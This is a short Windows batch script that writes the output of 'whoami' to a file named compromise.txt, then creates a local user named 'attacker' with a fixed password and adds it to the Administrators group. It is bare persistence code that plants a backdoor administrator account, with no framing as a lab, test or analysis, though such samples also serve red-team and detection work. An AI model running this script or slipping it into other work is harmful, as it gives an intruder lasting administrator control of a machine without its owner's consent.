@echo off
whoami > C:\temp\compromise.txt
net user attacker P@ssw0rd123 /add
net localgroup administrators attacker /add